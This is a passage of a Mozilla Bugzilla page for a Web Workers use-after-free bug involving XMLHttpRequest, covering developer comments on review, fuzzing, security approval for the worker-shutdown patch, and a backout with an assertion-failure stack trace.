          <div class="change-time"><span class="rel-time" title="2020-02-27 11:58 PST" data-time="1582833487">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Assertion failure: !mProxy-&gt;mSyncLoopTarget, at src/dom/xhr/XMLHttpRequestWorker.cpp:1416"
   href="/show_bug.cgi?id=1588248">1588248</a></div></div></div><div class="change-set" id="c35"><div class="comment" data-id="14665812" data-no="35"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-35" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a27270812_75935"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a27270812_75935"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-35"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-35" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c35">Comment 35</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-02-27 12:08 PST" data-time="1582834089">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-35">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-35" data-comment-id="14665812" data-ismarkdown="true" ><p>For the fixes here, we&#39;ll also want <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1588248" title="RESOLVED FIXED - Assertion failure: !mProxy-&gt;mSyncLoopTarget, at src/dom/xhr/XMLHttpRequestWorker.cpp:1416">bug 1588248</a> uplifted to esr68 to help mitigate.  I&#39;ve requested uplift approval for the fix on that bug.</p>
</div></div><div class="change-set" id="c37"><div class="comment" data-id="14693211" data-no="37"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-37" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_580382" id="a27270812_75935"><img src="https://secure.gravatar.com/avatar/15b9b3783e4671cd882bff1316df14c9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_580382" id="a27270812_75935"><a class="email " href="/user_profile?user_id=580382" > <span class="fna">Julien Cristau [:jcristau]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-37"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-37" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c37">Comment 37</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-03-13 02:54 PDT" data-time="1584093244">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-37">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-37" data-comment-id="14693211" data-ismarkdown="true" ><p>Is this ready for sec-approval?</p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox76&amp;o1=isnotempty">status-firefox76</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox76&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox76&amp;o1=isnotempty">tracking-firefox76</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox76&amp;o1=equals&amp;v1=%2B">+</a></div><div class="change">Flags: needinfo?(bugmail)</div></div></div><div class="change-set" id="c38"><div class="comment" data-id="14693569" data-no="38"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-38" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a27270812_75935"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a27270812_75935"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-38"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-38" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c38">Comment 38</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-03-13 07:22 PDT" data-time="1584109350">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-38">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-38" data-comment-id="14693569" data-ismarkdown="true" ><p>No, we want :baku&#39;s review as well.  I&#39;ve upgraded his review request to blocking to make that clear.</p>
<p>Relatedly, has our taskcluster migration given us a private try server that we can safely push security fixes to in order to have better test coverage than my local testing?</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(bugmail)</span></div></div></div><div class="change-set" id="c39"><div class="comment" data-id="14693582" data-no="39"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-39" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a27270812_75935"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a27270812_75935"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-39"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-39" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c39">Comment 39</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-03-13 07:28 PDT" data-time="1584109698">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-39">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-39" data-comment-id="14693582" data-ismarkdown="true" ><p>Setting NI on baku for review as well.</p>
</div><div class="activity"><div class="change">Flags: needinfo?(amarchesini)</div></div></div><div class="change-set" id="a28553246_446257"><div class="change" id="aa28553246_446257">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_446257" id="a28553246_446257"><img src="https://secure.gravatar.com/avatar/dfb8d0427dd67216b2664131a5c31421?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_446257" id="a28553246_446257"><a class="email " href="/user_profile?user_id=446257" > <span class="fna">Andrea Marchesini [:baku]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a28553246_446257"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a28553246_446257">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#a28553246_446257">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-03-13 09:12 PDT" data-time="1584115921">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(amarchesini)</span></div></div></div><div class="change-set" id="c40"><div class="comment" data-id="14694379" data-no="40"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-40" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a28553246_446257"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a28553246_446257"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-40"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-40" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c40">Comment 40</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-03-13 13:19 PDT" data-time="1584130762">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-40">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-40" data-comment-id="14694379" data-ismarkdown="true" ><p>I&#39;m currently running additional local tests against trunk and ESR68.  :RyanVM indicated via other channels that there is not currently a private try server available.</p>
</div></div><div class="change-set" id="c41"><div class="comment" data-id="14707062" data-no="41"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-41" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a28553246_446257"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a28553246_446257"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-41"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-41" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c41">Comment 41</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-03-20 09:58 PDT" data-time="1584723522">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-41">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-41" data-comment-id="14707062" data-ismarkdown="true" ><p>The exact test-case no longer reproduced, but I&#39;ve been concerned about other potential syncloop gadgets so now after some assistance from :jkratzer I&#39;m pursuing directed fuzzing.  The question I&#39;m trying to answer is whether we&#39;ve already mitigated the class of UAFs initially seen on this bug, and if so, on which releases it&#39;s mitigated.  The rationale is that there is some level of analytic complexity risk from the fix and it would be preferable to land it on trunk only, at least initially.</p>
</div></div><div class="change-set" id="c42"><div class="comment" data-id="14707089" data-no="42"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-42" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a28553246_446257"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a28553246_446257"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-42"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-42" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c42">Comment 42</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-03-20 10:03 PDT" data-time="1584723812">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-42">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-42" data-comment-id="14707089" data-ismarkdown="true" ><p>And by class of UAFs I mean:</p>
<ul>
<li>MessageChannel/BroadcastChannel allow content to run during syncloop destruction.</li>
<li>Syncloop-using APIs are called during syncloop destruction in a way that allows for use-after-frees due to bad assumptions in syncloop-using code.  (This may have required bad assumptions in conjunction with unsafe uses of raw pointers in cases that erroneously assume the raw pointer usage was covered by a strong reference.)</li>
</ul>
</div></div><div class="change-set" id="c43"><div class="comment" data-id="14711353" data-no="43"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-43" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_580382" id="a28553246_446257"><img src="https://secure.gravatar.com/avatar/15b9b3783e4671cd882bff1316df14c9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_580382" id="a28553246_446257"><a class="email " href="/user_profile?user_id=580382" > <span class="fna">Julien Cristau [:jcristau]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-43"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-43" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c43">Comment 43</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-03-23 08:30 PDT" data-time="1584977454">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-43">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-43" data-comment-id="14711353" data-ismarkdown="true" ><p>Sounds like this might be too risky to land late in the beta cycle, so I&#39;ll call it wontfix for 75; hopefully we can have it bake some more on 76.</p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox75&amp;o1=isnotempty">status-firefox75</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox75&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox75&amp;o1=equals&amp;v1=wontfix">wontfix</a></div></div></div><div class="change-set" id="c44"><div class="comment" data-id="14712172" data-no="44"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-44" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a28553246_446257"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a28553246_446257"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-44"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-44" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c44">Comment 44</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-03-23 14:02 PDT" data-time="1584997349">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-44">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-44" data-comment-id="14712172" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9130470" name="attach_9130470" title="Bug 1545345 - Improve worker shutdown. r=baku,smaug">attachment 9130470</a> <a href="/attachment.cgi?id=9130470&amp;action=edit" title="Bug 1545345 - Improve worker shutdown. r=baku,smaug">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1545345" title="RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest">Bug 1545345</a> - Improve worker shutdown. r=baku,smaug</p>
<h3>Security Approval Request</h3>
<ul>
<li><strong>How easily could an exploit be constructed based on the patch?</strong>: Not 100% clear at this time.  It&#39;s possible that the landing of <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1588248" title="RESOLVED FIXED - Assertion failure: !mProxy-&gt;mSyncLoopTarget, at src/dom/xhr/XMLHttpRequestWorker.cpp:1416">bug 1588248</a> (which is now on all supported branches including ESR68) solved the only UAF.  I&#39;m attempting local fuzzing to see if other issues might exist, but we can consider sec-approval in parallel to me finishing that up.</li>
</ul>
<p>This patch is about closing holes that definitely result in invariants being violated.  We do know how to violate the invariants from tests, we don&#39;t know how to cause a UAF.</p>
<p>If someone suspects that the patch might be related to a secbug, they might be suspicious of things involving syncloops and content re-entrancy.  This would give them a general idea of what to pursue, but various things that have landed (workers run at higher priorities, we do more global checks, etc.) should have upped the difficulty level.</p>
<p>We do have bugs on generally improving the state of workers so we could try and land this under the auspices of a bug like <a class="bz_bug_link
          bz_status_NEW" href="/show_bug.cgi?id=1539508" title="NEW - [meta] Simplify WorkerPrivate&#39;s end-of-life flow">bug 1539508</a>.</p>
<ul>
<li><strong>Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?</strong>: Unknown</li>
<li><strong>Which older supported branches are affected by this flaw?</strong>: esr68?</li>
<li><strong>If not all supported branches, which bug introduced the flaw?</strong>: None</li>
<li><strong>Do you have backports for the affected branches?</strong>: Yes</li>
<li><strong>If not, how different, hard to create, and risky will they be?</strong>:</li>
<li><strong>How likely is this patch to cause regressions; how much testing does it need?</strong>: The patch was intentionally designed to not be risky, but it&#39;s still touching/fixing stuff that&#39;s scary.  In discussion with RyanVM (and his discussions), we&#39;ve been talking about letting this just ride the train on nightly to beta and in general seeing how it bakes.</li>
</ul>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9130470&amp;action=edit"
           title="Bug 1545345 - Improve worker shutdown. r=baku,smaug"
           class=""
        >Attachment #9130470</a> -
        Flags: sec-approval?</div></div></div><div class="change-set" id="a29524244_1689"><div class="change" id="aa29524244_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a29524244_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a29524244_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a29524244_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a29524244_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#a29524244_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-03-24 14:55 PDT" data-time="1585086919">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9130470&amp;action=edit"
           title="Bug 1545345 - Improve worker shutdown. r=baku,smaug"
           class=""
        >Attachment #9130470</a> -
        Flags: sec-approval? &rarr; sec-approval+</div></div></div><div class="change-set" id="c45"><div class="comment" data-id="14714494" data-no="45"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-45" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a29524244_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a29524244_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-45"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-45" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c45">Comment 45</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-03-24 15:01 PDT" data-time="1585087291">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-45">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-45" data-comment-id="14714494" data-ismarkdown="true" ><blockquote>
<p>If someone suspects that the patch might be related to a secbug,</p>
</blockquote>
<p>We assume they will identify security patches since the check-in comment will have a bug reference that&#39;s not accessible, or suspiciously omit the bug number. The latter is bad for us in the future (&quot;why is this here?&quot;) so please do put in the bug number.</p>
<p>sec-approval+</p>
</div></div><div class="change-set" id="c46"><div class="comment" data-id="14719194" data-no="46"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-46" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_258347" id="a29524244_1689"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_258347" id="a29524244_1689"><a class="email " href="/user_profile?user_id=258347" > <span class="fna">Sebastian Hengst [:aryx] (needinfo on intermittent or backout)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-46"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-46" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c46">Comment 46</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-03-27 00:49 PDT" data-time="1585295354">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-46">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-46" data-comment-id="14719194" data-ismarkdown="true" ><p>Landed: <a href="https://hg.mozilla.org/integration/autoland/rev/e608cbaf20d451fe0dd63e778ffa3f9408b8c43d" rel="nofollow">https://hg.mozilla.org/integration/autoland/rev/e608cbaf20d451fe0dd63e778ffa3f9408b8c43d</a></p>
<p>Backed out for assertion failures on WorkerPrivate.cpp:</p>
<p><a href="https://hg.mozilla.org/integration/autoland/rev/a2d6508940de2b5cea50e409f6d00ee57711938c" rel="nofollow">https://hg.mozilla.org/integration/autoland/rev/a2d6508940de2b5cea50e409f6d00ee57711938c</a></p>
<p>Push with failures: <a href="https://treeherder.mozilla.org/#/jobs?repo=autoland&amp;group_state=expanded&amp;resultStatus=testfailed%2Cbusted%2Cexception%2Cretry%2Cusercancel%2Crunnable&amp;revision=e608cbaf20d451fe0dd63e778ffa3f9408b8c43d&amp;selectedJob=295001539" rel="nofollow">https://treeherder.mozilla.org/#/jobs?repo=autoland&amp;group_state=expanded&amp;resultStatus=testfailed%2Cbusted%2Cexception%2Cretry%2Cusercancel%2Crunnable&amp;revision=e608cbaf20d451fe0dd63e778ffa3f9408b8c43d&amp;selectedJob=295001539</a><br>
Failure log: <a href="https://treeherder.mozilla.org/logviewer.html#?job_id=295001539&amp;repo=autoland" rel="nofollow">https://treeherder.mozilla.org/logviewer.html#?job_id=295001539&amp;repo=autoland</a></p>
<p>devtools/client/aboutdebugging/test/browser/browser_aboutdebugging_devtoolstoolbox_reload.js</p>
<p>[task 2020-03-27T05:39:54.830Z] 05:39:54     INFO - GECKO(3816) | Assertion failure: mSyncLoopStack.IsEmpty(), at /builds/worker/checkouts/gecko/dom/workers/WorkerPrivate.cpp:3512<br>
[task 2020-03-27T05:39:54.910Z] 05:39:54     INFO - GECKO(3816) | #01: mozilla::dom::WorkerPrivate::DestroySyncLoop(unsigned int) [dom/workers/WorkerPrivate.cpp:3931]<br>
[task 2020-03-27T05:39:54.910Z] 05:39:54     INFO -<br>
[task 2020-03-27T05:39:54.911Z] 05:39:54     INFO - GECKO(3816) | #02: mozilla::dom::WorkerPrivate::RunCurrentSyncLoop() [dom/workers/WorkerPrivate.cpp:3905]<br>
[task 2020-03-27T05:39:54.911Z] 05:39:54     INFO -<br>
[task 2020-03-27T05:39:54.913Z] 05:39:54     INFO - GECKO(3816) | #03: mozilla::dom::<code>anonymous namespace&#39;::LoadAllScripts(mozilla::dom::WorkerPrivate*, mozilla::UniquePtr&lt;mozilla::dom::SerializedStackHolder,mozilla::DefaultDelete&lt;mozilla::dom::SerializedStackHolder&gt; &gt;, nsTArray&lt;mozilla::dom::(anonymous namespace)::ScriptLoadInfo&gt;&amp;, bool, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&amp;) [dom/workers/ScriptLoader.cpp:2242] [task 2020-03-27T05:39:54.914Z] 05:39:54 INFO - [task 2020-03-27T05:39:54.914Z] 05:39:54 INFO - GECKO(3816) | #04: mozilla::dom::workerinternals::LoadMainScript(mozilla::dom::WorkerPrivate*, mozilla::UniquePtr&lt;mozilla::dom::SerializedStackHolder,mozilla::DefaultDelete&lt;mozilla::dom::SerializedStackHolder&gt; &gt;, nsTSubstring&lt;char16_t&gt; const&amp;, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&amp;) [dom/workers/ScriptLoader.cpp:2349] [task 2020-03-27T05:39:54.914Z] 05:39:54 INFO - [task 2020-03-27T05:39:54.914Z] 05:39:54 INFO - GECKO(3816) | #05: mozilla::dom::</code>anonymous namespace&#39;::CompileScriptRunnable::WorkerRun(JSContext*, mozilla::dom::WorkerPrivate*) [dom/workers/WorkerPrivate.cpp:343]<br>
[task 2020-03-27T05:39:54.914Z] 05:39:54     INFO -<br>
[task 2020-03-27T05:39:54.914Z] 05:39:54     INFO - GECKO(3816) | #06: mozilla::dom::WorkerRunnable::Run() [dom/workers/WorkerRunnable.cpp:371]<br>
[task 2020-03-27T05:39:54.914Z] 05:39:54     INFO -<br>
[task 2020-03-27T05:39:54.916Z] 05:39:54     INFO - GECKO(3816) | #07: nsThread::ProcessNextEvent(bool, bool*) [xpcom/threads/nsThread.cpp:1222]<br>
[task 2020-03-27T05:39:54.916Z] 05:39:54     INFO -<br>
[task 2020-03-27T05:39:54.916Z] 05:39:54     INFO - GECKO(3816) | #08: NS_ProcessNextEvent(nsIThread*, bool) [xpcom/threads/nsThreadUtils.cpp:481]<br>
[task 2020-03-27T05:39:54.916Z] 05:39:54     INFO -<br>
[task 2020-03-27T05:39:54.916Z] 05:39:54     INFO - GECKO(3816) | #09: mozilla::dom::WorkerPrivate::DoRunLoop(JSContext*) [dom/workers/WorkerPrivate.cpp:2912]<br>
[task 2020-03-27T05:39:54.916Z] 05:39:54     INFO -<br>
[task 2020-03-27T05:39:54.916Z] 05:39:54     INFO - GECKO(3816) | #10: mozilla::dom::workerinternals::`anonymous namespace&#39;::WorkerThreadPrimaryRunnable::Run() [dom/workers/RuntimeService.cpp:2301]<br>
[task 2020-03-27T05:39:54.916Z] 05:39:54     INFO -<br>
[task 2020-03-27T05:39:54.916Z] 05:39:54     INFO - GECKO(3816) | #11: nsThread::ProcessNextEvent(bool, bool*) [xpcom/threads/nsThread.cpp:1222]<br>
[task 2020-03-27T05:39:54.916Z] 05:39:54     INFO -<br>
[task 2020-03-27T05:39:54.917Z] 05:39:54     INFO - GECKO(3816) | #12: NS_ProcessNextEvent(nsIThread*, bool) [xpcom/threads/nsThreadUtils.cpp:481]<br>
[task 2020-03-27T05:39:54.917Z] 05:39:54     INFO -<br>
[task 2020-03-27T05:39:54.918Z] 05:39:54     INFO - GECKO(3816) | #13: mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) [ipc/glue/MessagePump.cpp:332]<br>
[task 2020-03-27T05:39:54.918Z] 05:39:54     INFO -<br>
